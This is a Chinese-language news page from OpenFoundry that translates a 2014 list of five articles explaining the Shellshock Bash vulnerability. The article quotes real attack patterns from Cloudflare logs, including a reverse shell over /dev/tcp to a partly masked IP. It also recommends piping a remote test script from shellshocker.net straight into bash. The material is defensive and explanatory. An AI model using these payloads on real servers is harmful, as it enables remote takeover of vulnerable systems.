@@ -1,0 +1,419 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="zh-tw" lang="zh-tw" >
+<head>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script>
+<link rel="shortcut icon" href="../../images/favicon.ico" />
+	  <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+  <meta name="robots" content="index, follow" />
+  <meta name="keywords" content="OSSFNL863" />
+  <meta name="title" content="了解 Shellshock Bash 臭蟲該讀的五篇文章" />
+  <meta name="description" content="本文翻譯自 Javarevisited，原作者為 Javin Paul：https://javarevisited.blogspot.tw/2014/10/5- articles -to-learn-about-shellshock.html 2014 年看起來就像充斥重大軟體 臭蟲與漏洞的一年。今年稍早，網際網路才因為 Heartbleed 漏洞受傷流血，現在又因為 ShellShock" />
+  <meta name="generator" content="" />
+  <title>了解 Shellshock Bash 臭蟲該讀的五篇文章 - OpenFoundry</title>
+  <link href="../../favicon.ico" rel="shortcut icon" type="image/x-icon" />
+  <link rel="stylesheet" href="../../components/com_gantry/css/gantry.css" type="text/css" />
+  <link rel="stylesheet" href="../../components/com_gantry/css/grid-12.css" type="text/css" />
+  <link rel="stylesheet" href="../../components/com_gantry/css/joomla.css" type="text/css" />
+  <link rel="stylesheet" href="../../templates/rt_quantive_j15/css/joomla.css" type="text/css" />
+  <link rel="stylesheet" href="../../templates/rt_quantive_j15/css/style1.css" type="text/css" />
+  <link rel="stylesheet" href="../../templates/rt_quantive_j15/css/light-body.css" type="text/css" />
+  <link rel="stylesheet" href="../../templates/rt_quantive_j15/css/demo-styles.css" type="text/css" />
+  <link rel="stylesheet" href="../../templates/rt_quantive_j15/css/template.css" type="text/css" />
+  <link rel="stylesheet" href="../../templates/rt_quantive_j15/css/typography.css" type="text/css" />
+  <link rel="stylesheet" href="../../templates/rt_quantive_j15/css/fusionmenu.css" type="text/css" />
+  <style type="text/css">
+    <!--
+#rt-main-surround ul.menu li.active > a, #rt-main-surround ul.menu li.active > .separator, #rt-main-surround ul.menu li.active > .item, #rt-main-surround .square4 ul.menu li:hover > a, #rt-main-surround .square4 ul.menu li:hover > .item, #rt-main-surround .square4 ul.menu li:hover > .separator, .roktabs-links ul li.active span {color:#0088B5;}
+a, #rt-main-surround ul.menu a:hover, #rt-main-surround ul.menu .separator:hover, #rt-main-surround ul.menu .item:hover {color:#0088B5;}
+    -->
+  </style>
+  <script type="text/javascript" src="../../components/com_jcomments/js/jcomments-v2.1.js%3Fv=2"></script>
+  <script type="text/javascript" src="../../components/com_jcomments/libraries/joomlatune/ajax.js"></script>
+  <script type="text/javascript" src="../../media/system/js/mootools.js"></script>
+  <script type="text/javascript" src="../../media/system/js/caption.js"></script>
+  <script type="text/javascript" src="../../components/com_gantry/js/gantry-buildspans.js"></script>
+  <script type="text/javascript" src="../../components/com_gantry/js/gantry-inputs.js"></script>
+  <script type="text/javascript" src="../../templates/rt_quantive_j15/js/jquery.cookie.js"></script>
+  <script type="text/javascript" src="../../modules/mod_roknavmenu/themes/fusion/js/fusion.js"></script>
+  <script type="text/javascript" src="../../modules/mod_ofssologin/js/ofssologin.js"></script>
+  <script type="text/javascript">
+
+			window.addEvent('domready', function() {
+				var modules = ['rt-block'];
+				var header = ['h3','h2','h1'];
+				GantryBuildSpans(modules, header);
+			});
+		InputsExclusion.push('.content_vote','#rt-popup')
+		        window.addEvent('load', function() {
+					new Fusion('ul.menutop', {
+						pill: 0,
+						effect: 'slide and fade',
+						opacity: 1,
+						hideDelay: 500,
+						centered: 0,
+						tweakInitial: {'x': -2, 'y': 0},
+        				tweakSubsequent: {'x': 0, 'y': -14},
+						menuFx: {duration: 200, transition: Fx.Transitions.Sine.easeOut},
+						pillFx: {duration: 400, transition: Fx.Transitions.Back.easeOut}
+					});
+	            });
+  </script>
+<!-- <script type="text/javascript" src="/sso/javascripts/langsync.js"></script> -->
+<!-- <script src="/templates/rt_quantive_j15/js/ossf.js"></script> -->
+<script type="text/javascript">
+
+  var _gaq = _gaq || [];
+  _gaq.push(['_setAccount', 'UA-4136519-1']);
+  _gaq.push(['_trackPageview']);
+
+  (function() {
+    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+  })();
+
+</script>
+</head>
+	<body  class="backgroundlevel-low backgroundstyle-style8 bodylevel-med bodystyle-light cssstyle-style1 logostyle-dark font-family-helvetica font-size-is-default menu-type-fusionmenu col12 ">
+		<div id="rt-main-background">
+			<div class="rt-container">
+																<div id="rt-header">
+					<div class="rt-grid-7 rt-alpha">
+    			<div class="rt-block">
+    	    	<a href="../../index.html" id="rt-logo"></a>
+    		</div>
+	    
+</div>
+<div class="rt-grid-5 rt-omega">
+                    <div class="square9">
+                    <div class="rt-block">
+				<div class="rt-module-surround">
+					<div class="rt-module-top"><div class="rt-module-top2"><div class="rt-module-top3"></div></div></div>
+					<div class="rt-module-inner">
+	                							<div class="module-content">
+		                	<div class="ofssologin_square9"><a href="../../index.html">登入</a>&nbsp;&nbsp|&nbsp;&nbsp;<span><a href="https://www.openfoundry.org/en/news/9301?task=view" ><span lang="en" xml:lang="en">English</span></a></li></ul></span><!--Joom!fish V2.0.4 (Lightning)-->
+<!-- &copy; 2003-2009 Think Network, released under the GPL. -->
+<!-- More information: at http://www.joomfish.net -->
+<div class="ofssologin_search_square9">
+  <form id="of_search" action="https://www.openfoundry.org/of/openfoundry/search" method="get" onsubmit="of_search(); return false;">
+    <select id="of_search_type">
+      <option value="Projects"> 專案 </option>
+      <option value="Content"> 文章 </option>
+      <option value="People"> 人才 </option>
+    </select>
+    <input id="query" name="query" id="mod_search_searchword" maxlength="50" alt="search" class="inputbox" type="text" size="28" value="search..."  onblur="if(this.value=='') this.value='search...';" onfocus="if(this.value=='search...') this.value='';" />
+    <input type="hidden" name="commit" value="search" />
+  </form>
+</div></div>						</div>
+					</div>
+					<div class="rt-module-bottom"><div class="rt-module-bottom2"><div class="rt-module-bottom3"></div></div></div>
+				</div>
+            </div>
+                </div>
+		
+</div>
+					<div class="clear"></div>
+				</div>
+																<div id="rt-navigation"><div id="rt-navigation2"><div id="rt-navigation3">
+					
+<div class="nopill">
+	<ul class="menutop level1 " >
+						<li class="item1 root" >
+					<a class="orphan item bullet" href="../../index.html"  >
+				<span>
+			    				首頁				   
+				</span>
+			</a>
+			
+			
+	</li>	
+							<li class="item32 root" >
+					<a class="orphan item bullet" href="../../archived.html"  >
+				<span>
+			    				專案				   
+				</span>
+			</a>
+			
+			
+	</li>	
+							<li class="item186 root" >
+					<a class="orphan item bullet" href="../community.html"  >
+				<span>
+			    				Who&#039;s Who				   
+				</span>
+			</a>
+			
+			
+	</li>	
+							<li class="item4 root" >
+					<a class="orphan item bullet" href="../news.html"  >
+				<span>
+			    				新聞				   
+				</span>
+			</a>
+			
+			
+	</li>	
+							<li class="item5 root" >
+					<a class="orphan item bullet" href="../law-and-licensing.html"  >
+				<span>
+			    				法律源地				   
+				</span>
+			</a>
+			
+			
+	</li>	
+							<li class="item3 root" >
+					<a class="orphan item bullet" href="../activities.html"  >
+				<span>
+			    				活動				   
+				</span>
+			</a>
+			
+			
+	</li>	
+							<li class="item2 root" >
+					<a class="orphan item bullet" href="../resourcecatalog%3FName=Value.html"  >
+				<span>
+			    				資源表列				   
+				</span>
+			</a>
+			
+			
+	</li>	
+							<li class="item45 root" >
+					<a class="orphan item bullet" href="../about.html"  >
+				<span>
+			    				關於				   
+				</span>
+			</a>
+			
+			
+	</li>	
+				</ul>
+</div>
+
+				    <div class="clear"></div>
+				</div></div></div>
+								<div class="rt-surround"><div class="rt-surround2"><div class="rt-surround3">
+										<div id="rt-showcase-section">
+												<div id="rt-showcase">
+							<div class="rt-grid-12 rt-alpha rt-omega">
+    		<div class="clear"></div>
+		
+		
+                <div class="close-note">
+                    <div class="rt-block">
+               					<div class="module-content">
+                	<div style="font-size:medium; background-image:linear-gradient(120deg,#159957,#4298b2);color:white;padding:20px;margin:-10px -18px;">感謝您對「自由軟體鑄造場」的支持與愛護，十多年來「自由軟體鑄造場」受中央研究院支持，並在資訊科學研究所以及資訊科技創新研究中心執行，現已完成階段性的任務。 本網站預計持續維運至 2021年底，網站內容基本上不會再更動。<br />也紀念我們永遠的朋友 李士傑先生（Shih-Chieh Ilya Li）。</div>				</div>
+            </div>
+                </div>
+		
+</div>
+							<div class="clear"></div>
+						</div>
+																	</div>
+															<div id="rt-main-surround">
+												<div id="rt-breadcrumbs">
+								<div class="rt-breadcrumb-surround">
+		<a href="../../index.html" id="breadcrumbs-home"></a>
+		<span class="breadcrumbs pathway">
+<span class="no-link">新聞</span></span>
+	</div>
+	
+							<div class="clear"></div>
+						</div>
+																							              <div id="rt-main" class="sa3-mb9">
+                <div class="rt-main-inner">
+                    <div class="rt-grid-9 rt-push-3">
+                                                <div class="rt-block">
+                            							<div class="square1">
+							<div class="rt-module-surround">
+								<div class="rt-module-top"><div class="rt-module-top2"><div class="rt-module-top3"></div></div></div>
+								<div class="rt-module-inner">
+		                            <div id="rt-mainbody">
+		                                
+<div class="rt-joomla ">
+	<div class="rt-article">
+		
+				<div class="rt-headline"><h1 class="rt-article-title">了解 Shellshock Bash 臭蟲該讀的五篇文章</h1>		</div>
+		<div class="clear"></div>
+		
+		
+		
+				<div class="rt-articleinfo">
+						<div class="rt-article-icons">
+								<a href="https://www.openfoundry.org/tw/news/9301-shellshock-bash-articles?tmpl=component&amp;print=1&amp;page=" title="列印" onclick="window.open(this.href,'win2','status=no,toolbar=no,scrollbars=yes,titlebar=no,menubar=no,resizable=yes,width=640,height=480,directories=no,location=no'); return false;" rel="nofollow"><span class="icon print"></span></a>																</div>
+			
+			<span class="rt-date-posted">
+						建立日期			2014-10-14 16:43						&nbsp;&nbsp;&nbsp;&nbsp;						</span>
+
+						<span class="rt-author">
+				作者是 謝良奇／翻譯			</span>
+				
+					</div>
+		
+		
+		<p><strong>本文翻譯自 Javarevisited，原作者為 Javin Paul：<a href="https://javarevisited.blogspot.tw/2014/10/5-articles-to-learn-about-shellshock.html">https://javarevisited.blogspot.tw/2014/10/5-articles-to-learn-about-shellshock.html</a></strong></p>
+<p>2014 年看起來就像充斥重大軟體臭蟲與漏洞的一年。今年稍早，網際網路才因為 Heartbleed 漏洞受傷流血，現在又因為 ShellShock 臭蟲而飽受震驚。對我來說後者看起來比 Heartbleed 還嚴重，因為問題出在 Bash Shell，所有 UNIX shells 中最普遍的一個。由於投資銀行、保險公司、雲端、電子商務領域的多數伺服器，都是最常使用到 bash 的 Linux 伺服器，影響所及相當廣大。我確定採用 Microsoft 軟體堆疊的人現在正樂不可支，不過等一等，請讀完整篇文章。</p>
+
+<p>當消息在線上與線下世界傳開之後，Shellshock 臭蟲的細節開始浮現。大家都在談論，工程師忙著修補伺服器、電腦、路由器、防火牆，以及其他用到有問題 bash 的電腦資源。幾乎每個地方都在修補。我知道許多我的讀者依然對 ShellShock 臭蟲感到困惑。對於他們來說，這是個任意代碼執行 (arbitrary code execution，ACE) 漏洞，這表示攻擊者可以在你有漏洞的伺服器上，執行他們的程式。這跟你有什麼關係？如果他們可以執行他們的指令的話，就可以對你的伺服器和業務予取予求。一開始他們可以停止你的伺服器、刪除檔案、偷取密碼並完全控制該機器、執行遠端操作。一般來說，任意代碼執行漏洞攻擊非常的複雜，需要對程式碼執行內部、記憶體配置、組合語言有著專家般理解才行，使得這些攻擊非常困難。</p>
+<p>多謝了 Bash ShellShock 臭蟲，現在甚至是新手程式設計者也可以發動如此強大的攻擊，控制有漏洞的伺服器。舉例來說，由於 ShellShock 漏洞，任何人都可以僅僅透過發送 HTTP 要求來控制你的網路伺服器。雖然很嚴重，但所幸影響只限於那些伺服器端程式將用戶提供資訊傳遞給 Bash Shell 的伺服器。如果你的 Java 伺服器沒做這件事，你可能就不會受到這種攻擊影響。</p>
+<p>順帶一提，假如你上週正巧到某個沒有網路的鄉村度假，對於 Bash Shell 裡的 ShellShock 臭蟲一無所知，這裡列出了五篇文章能告訴你有關這個 Bash 臭蟲的一切，從介紹它到駭客如何加以運用。甚至有些網站或工具，可以檢查你的伺服器是否受到 ShellShock 影響。你可以用這個網站檢查你的系統有沒有漏洞，並了解如何加以修補，以免於受攻擊風險。</p>
+<h3 id="深入-shellshock駭客如何利用它入侵系統"><a href="https://blog.cloudflare.com/inside-shellshock/">深入 Shellshock：駭客如何利用它入侵系統</a></h3>
+<p>這是我在 ShellShock 問題上讀到最好的文章之一，我建議所有人最先讀這一篇。Cloudflare 很高竿地用簡單的話解釋了 ShellShock 臭蟲。讀完這篇之後，你就知道 () { :; }; 這些魔術字串是如何把你的伺服器控制權，交到遠在千里之外的駭客手上。Cloudflare 不僅迅速地修補好他們的伺服器，以保障其客戶權益，更讓人們了解此一重大漏洞。由於他們宣稱阻擋了威脅，並限制遭到濫用的殭屍程序和爬蟲，浪費他們用戶的頻寬與伺服器資源，這也有助於他們的業務。我之所以列出這一篇文章，還有一個理由。它使用了範例示範駭客如何看來無害的 HTTP 要求，來利用 bash shell 的 ShellShock 漏洞。CloudFlare 還放出了阻擋利用 ShellShock 的 WAF 規則。這個臭蟲在他們的記錄檔，有著某些共同的模式：</p>
+<pre><code>() { :;}; /bin/ping -c 1 198.x.x.x; 
+() { :;}; echo shellshock-scan &gt; /dev/udp/example.com/1234 
+() { ignored;};/bin/bash -i &gt;&amp; /dev/tcp/104.x.x.x/80 0&gt;&amp;1
+</code></pre>
+<p>假如你是 CloudFlare 的客戶，你可以鬆一口氣了，不過你也可以用這些模式，看看你的網路伺服器上有沒有類似的東西。感謝 　John Graham-Cumming 這麼棒的作品。你還在等什麼，趕快閱讀這篇文章吧。</p>
+<h3 id="關於-shellshock-bash-臭蟲你必須知道的一切"><a href="https://www.troyhunt.com/2014/09/everything-you-need-to-know-about.html">關於 ShellShock Bash 臭蟲你必須知道的一切</a></h3>
+<p>Troy Hunt 是 Microsoft 在開發者安全的最有價值專家 (Most Valuable Professional)，他今年稍早曾針對 Heartbleed 臭蟲分享過類似資訊。Tony 擅長提供人們確切資訊，協助他們從誇大宣傳中剖析出真正的潛在風險。從介紹 bash shell 以及其用途開始，Tony 分享了這個臭蟲事實上為何， 以及其潛在的後果。除此之外，還有像是哪個版本的 Bash shells 會受影響，ShellShock 臭蟲何時首次被發現，風險會持續多久等。由於 bash 基本上是一種 UNIX shell，他也分析了 Microsoft 軟體堆疊在何種情況下也會受到該臭蟲影響。這篇文章最棒的地方在於，告訴你接下來可以做些什麼。他從系統管理者與消費者的角度，解釋了接下來的步驟。簡單來說，這篇文章就跟其標題一樣，就是關於 ShellShock Bash 臭蟲你必須知道的一切。</p>
+<h3 id="bash-的-shellshock-臭蟲可能成為蠕蟲"><a href="https://blog.erratasec.com/2014/09/bash-shellshock-bug-is-wormable.html">Bash 的 ‘shellshock’ 臭蟲可能成為蠕蟲</a></h3>
+<p>Robert Graham 透過初步掃描評估了這個臭蟲的影響。他的掃描初步結果顯示出有多少系統僅於 80 port，或僅在根路徑的 “/” URL，或在沒有 Host 欄位時存有漏洞。他提出很棒的一點，就是 CGI 腳本如果有呼叫 bash，不論有多間接，也可能造成漏洞。他更提到在特殊 port 上的嵌入式網路伺服器，才是真正的危險所在，而且不只是 web，其他像是 DHCP 服務也會受這個臭蟲影響。</p>
+<h3 id="網際網路的-bash-shellshock-掃描"><a href="https://blog.erratasec.com/2014/09/bash-shellshock-scan-of-internet.html">網際網路的 Bash ‘shellshock’ 掃描</a></h3>
+<p>這是 Robert Graham 最初做的掃描，也就是上一篇文章所討論的。現在惡意軟體正使用他的用戶代理 (user agent)，假裝是已知的掃描。Robert 的掃描是將一大堆 ping home 指令，塞進各種 CGI 變數裡，只為了看看這個 bash 臭蟲漏洞有多麼廣泛，但是這已足以在許多網站管理者間，造成小小的恐慌。這個掃描只發現了數千部系統 （因為有意的限制），不過已經顯示出 ShellShock 臭蟲的實際潛力。</p>
+<h3 id="shellshock-bash-漏洞測試器"><a href="https://shellshocker.net/">Shellshock BASH 漏洞測試器</a></h3>
+<p>這個網站是由醫療資訊工程 (Medical Informatics Engineering) 的醫療 IT 團隊所開發。他們分享了對 shellshock 漏洞的了解，以及如何保護他們的基礎建設。這個網站對於了解 shellshock 和避免受到影響很有幫助。許多人貢獻了簡單的指令，可用來測試你的伺服器是否會受到 shellshock 影響。例如，你可以執行這一行來確認你的機器是否有漏洞：</p>
+<pre><code>curl https://shellshocker.net/shellshock_test.sh | bash
+</code></pre>
+<p>如果你希望對每一個問題 (CVE-2014-6271、CVE-2014-7169、CVE-2014-7186、CVE-2014-7187、CVE-2014-6277、CVE-2014-6278) 個別做測試，他們也有逐步進行的指南。透過這裡的連接，你也可以找到一些有關現實 ShellShock 攻擊的文章。</p>
+<p>簡而言之，ShellShock 是 GNU 的 bash shell 裡的一個漏洞，讓攻擊者得以在受影響系統上執行遠端指令。假如你的系統從 Tue Sep 30 2014: 1:32PM EST 之後沒有更新過 bash 的話，你非常有可能已經受到影響。根據 NVD，這個安全漏洞影響範圍從 1994 年釋出的 1.14 版本到最近的 4.3 版。如果你的網站交由主要雲端供應者代管，他們很可能已經做好修補。如果你在大型組織內工作，你可以已經注意到修補 UNIX 伺服器的動作突然暴增。我還沒有聽到任何 bash shellshock 臭蟲造成的事件，希望所有伺服器都能在為時已晚之前做好修補。</p>
+			<!-- Show relate article -->
+				<!-- end -->
+		<div class="article_note">
+		<!-- Add tags use metakey, and show OSSF Newsletter tag: OSSFNL+NUM-->
+		<br><br> <hr style='border: 1px dashed #D2DADB;'><b>自由軟體鑄造場電子報&nbsp;:</b>&nbsp;<a href='../../previous-issue%3Ftask=view&amp;id=863.html'>第 251 期 我懂你想說什麼！專訪銘傳大學「一個行動手語圖形檢索參考架構與系統」</a><br>				<!-- End -->
+					<br>
+					<b>分類: </b><a href="../foss-news.html">				源碼新聞					</a>				</div>
+			 <!-- AddThis Button BEGIN ID 3001 is the front page article -->
+     			<br><br>
+       <div class="addthis_toolbox addthis_default_style addthis_32x32_style">
+       <a class="addthis_button_preferred_1"></a>
+       <a class="addthis_button_preferred_2"></a>
+       <a class="addthis_button_preferred_3"></a>
+       <a class="addthis_button_preferred_4"></a>
+       <a class="addthis_button_compact"></a>
+       <a class="addthis_counter addthis_bubble_style"></a>
+       </div>
+       <script type="text/javascript">var addthis_config = {"data_track_clickback":true};</script>
+       <script type="text/javascript" src="http://s7.addthis.com/js/250/addthis_widget.js#pubid=openfoundry"></script>
+       <!-- AddThis Button END -->
+     <br>
+		<div class="totop" ><a class="rt-totop" href="9301%3Ftask=view.html#" style="outline: medium none;">↑ Top</a></div>
+            <!-- AddThis Button END -->
+
+			</div>
+</div>
+
+		                            </div>
+									<div class="clear"></div>
+								</div>
+								<div class="rt-module-bottom"><div class="rt-module-bottom2"><div class="rt-module-bottom3"></div></div></div>
+							</div>
+							</div>
+                                                    </div>
+                                            </div>
+                                <div class="rt-grid-3 rt-pull-9">
+                <div id="rt-sidebar-a">
+                                    <div class="square4">
+                    <div class="rt-block">
+				<div class="rt-module-surround">
+					<div class="rt-module-top"><div class="rt-module-top2"><div class="rt-module-top3"></div></div></div>
+					<div class="rt-module-inner">
+	                							<div class="module-content">
+		                	<ul class="menu"><li class="item56"><a href="../previous-issue.html"><span>電子報總覽</span></a></li><li class="item55"><a href="../about-newsletter.html"><span>關於本報</span></a></li></ul>						</div>
+					</div>
+					<div class="rt-module-bottom"><div class="rt-module-bottom2"><div class="rt-module-bottom3"></div></div></div>
+				</div>
+            </div>
+                </div>
+		                    <div class="rt-block">
+				<div class="rt-module-surround">
+					<div class="rt-module-top"><div class="rt-module-top2"><div class="rt-module-top3"></div></div></div>
+					<div class="rt-module-inner">
+	                							<div class="module-content">
+		                	<ul class="menu"><li class="item115"><a href="../foss-news.html"><span>源碼新聞</span></a></li><li class="item141"><a href="../case-job.html"><span>接案 / 工作</span></a></li></ul>						</div>
+					</div>
+					<div class="rt-module-bottom"><div class="rt-module-bottom2"><div class="rt-module-bottom3"></div></div></div>
+				</div>
+            </div>
+        	                <div class="square1">
+                    <div class="rt-block">
+				<div class="rt-module-surround">
+					<div class="rt-module-top"><div class="rt-module-top2"><div class="rt-module-top3"></div></div></div>
+					<div class="rt-module-inner">
+	                							<div class="module-title"><h2 class="title">專欄總覽</h2></div>
+						<div class="clear"></div>
+		                						<div class="module-content">
+		                	<ul class="menu"><li class="item37"><a href="../tech-column.html"><span>技術專欄</span></a></li><li class="item40"><a href="../foss-programs.html"><span>源碼秘技</span></a></li><li class="item35"><a href="../legal-article-.html"><span>法律專欄</span></a></li><li class="item154"><a href="../foss-forum.html"><span>自由專欄</span></a></li><li class="item162"><a href="../enterprise-application.html"><span>企業應用</span></a></li><li class="item44"><a href="../foss-projects.html"><span>源碼專案</span></a></li></ul>						</div>
+					</div>
+					<div class="rt-module-bottom"><div class="rt-module-bottom2"><div class="rt-module-bottom3"></div></div></div>
+				</div>
+            </div>
+                </div>
+		                <div class="square1">
+                    <div class="rt-block">
+				<div class="rt-module-surround">
+					<div class="rt-module-top"><div class="rt-module-top2"><div class="rt-module-top3"></div></div></div>
+					<div class="rt-module-inner">
+	                							<div class="module-content">
+		                	<p style="text-align: center;"><a href="../../news%3Fformat=feed&amp;type=rss" target="_black"><img src="../../images/M_images/news-rss-feed.png" border="0" /></a><br /><a href="https://www.openfoundry.org/rss-feed/Newsletter" target="_black"><img src="../../images/M_images/newsletter-rss-feed.png" border="0" /></a></p>						</div>
+					</div>
+					<div class="rt-module-bottom"><div class="rt-module-bottom2"><div class="rt-module-bottom3"></div></div></div>
+				</div>
+            </div>
+                </div>
+		
+                </div>
+            </div>
+
+                    <div class="clear"></div>
+                </div>
+            </div>
+																													</div>
+										<div id="rt-copyright">
+						<div class="rt-grid-12 rt-alpha rt-omega">
+                        <div class="rt-block">
+				<div class="rt-module-surround">
+					<div class="rt-module-top"><div class="rt-module-top2"><div class="rt-module-top3"></div></div></div>
+					<div class="rt-module-inner">
+	                							<div class="module-content">
+		                	<div id="desktop-mobile-version-switch"><span id="mobile-version" class="version-switch"><a href="9301%3Ftask=view.html#">行動版</a></span></div>
+自由軟體鑄造場 製作 最佳瀏覽狀態：IE7或Firefox2.0以上 (建議使用Firefox) ‧ 解析度1024*768 <br /> <strong>E-Mail</strong>：<a href="mailto:contact@openfoundry.org">contact@openfoundry.org</a> <strong>Address</strong>：台北市南港區研究院路2段128號 中央研究院資訊科學研究所 . <a href="../../privacy-policy.html">隱私權條款</a>. <a href="../../terms-of-use.html">使用條款</a><span style="position: relative; top: 8px; margin-top: -8px;"> <a href="../../about/8101.html"><img src="../../images/M_images/rss-feed-all.png" border="0" /></a></span>						</div>
+					</div>
+					<div class="rt-module-bottom"><div class="rt-module-bottom2"><div class="rt-module-bottom3"></div></div></div>
+				</div>
+            </div>
+        	
+</div>
+						<div class="clear"></div>
+					</div>
+					<div class="rt-footer-bottom-wrap"><div class="rt-footer-bottom"><div class="rt-footer-bottom2"><div class="rt-footer-bottom3"></div></div></div></div>
+									</div></div></div>
+				<div class="rt-surround-bottom"><div class="rt-surround-bottom2"><div class="rt-surround-bottom3"></div></div></div>
+							</div>
+		</div>
+		<!--
+		<script id="aptureScript">
+						(function (){var a=document.createElement("script");a.defer="true";a.src="http://www.apture.com/js/apture.js?siteToken=vsJttrn";document.getElementsByTagName("head")[0].appendChild(a);})();
+     </script>
+-->
+
+<!-- Piwik -->
+<!-- 			<script type="text/javascript">
+			  var _paq = _paq || [];
+		  _paq.push(["trackPageView"]);
+		  _paq.push(["enableLinkTracking"]);
+
+		    (function() {
+			        var u=(("https:" == document.location.protocol) ? "https" : "https") + "://www.openfoundry.org/piwik/";
+				    _paq.push(["setTrackerUrl", u+"piwik.php"]);
+				    _paq.push(["setSiteId", "1"]);
+				        var d=document, g=d.createElement("script"), s=d.getElementsByTagName("script")[0]; g.type="text/javascript";
+				        g.defer=true; g.async=true; g.src=u+"piwik.js"; s.parentNode.insertBefore(g,s);
+					  })();
+		  </script> -->
+<!-- End Piwik Code -->
+	</body>
+</html>
